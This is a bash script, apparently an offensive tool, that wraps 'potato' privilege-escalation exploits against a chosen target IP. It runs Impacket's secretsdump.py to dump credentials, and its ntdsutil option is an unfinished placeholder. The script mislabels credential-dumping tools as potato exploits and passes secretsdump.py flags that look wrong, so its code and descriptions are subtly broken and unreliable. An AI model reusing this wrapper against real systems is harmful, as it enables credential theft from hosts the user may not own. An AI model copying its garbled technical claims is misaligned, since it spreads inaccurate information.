#!/usr/bin/env bash

# potato.sh - Unified wrapper for various privilege‑escalation "potato" exploits
# -----------------------------------------------------------------------------
# Supported exploits (selected via -e):
#   - secretsdump   : Wrapper around Impacket's secretsdump.py
#   - ntdsutil      : Uses ntdsutil for local admin escalation
#   - other         : Placeholder for additional potato techniques
# Usage:
#   ./potato.sh -e <exploit> -t <target> [-u <username>] [-p <password>]
# Options:
#   -e  Exploit name (required)
#   -t  Target IP or hostname (required)
#   -u  Username (optional, for credential‑based exploits)
#   -p  Password (optional)
#   -h  Show this help message
# -----------------------------------------------------------------------------

set -euo pipefail

usage() {
  grep '^#' "$0" | sed -e 's/^# //'
  exit 1
}

# Default values
EXPLOIT=""
TARGET=""
USER=""
PASS=""

while getopts ":e:t:u:p:h" opt; do
  case $opt in
    e) EXPLOIT="$OPTARG" ;;
    t) TARGET="$OPTARG" ;;
    u) USER="$OPTARG" ;;
    p) PASS="$OPTARG" ;;
    h) usage ;;
    \?) echo "Invalid option: -$OPTARG" >&2; usage ;;
    :) echo "Option -$OPTARG requires an argument" >&2; usage ;;
  esac
done

if [[ -z "$EXPLOIT" || -z "$TARGET" ]]; then
  echo "Error: both -e (exploit) and -t (target) are required" >&2
  usage
fi

SCRIPT_DIR=$(dirname "$0")

case "$EXPLOIT" in
  secretsdump)
    # Ensure secretsdump.py is available (from impacket)
    if ! command -v secretsdump.py >/dev/null 2>&1; then
      echo "Error: secretsdump.py not found in PATH" >&2
      exit 1
    fi
    CMD=("secretsdump.py" "-no-pass" "-target" "$TARGET")
    if [[ -n "$USER" ]]; then CMD+=("-username" "$USER"); fi
    if [[ -n "$PASS" ]]; then CMD+=("-password" "$PASS"); fi
    ;;
  ntdsutil)
    # Placeholder command – real usage depends on the specific exploit script
    CMD=("ntdsutil" "" )
    echo "[!] ntdsutil exploit not fully implemented – adjust as needed"
    ;;
  *)
    echo "Error: unknown exploit '$EXPLOIT'" >&2
    exit 1
    ;;
esac

echo "[+] Running $EXPLOIT exploit against $TARGET"
"${CMD[@]}"
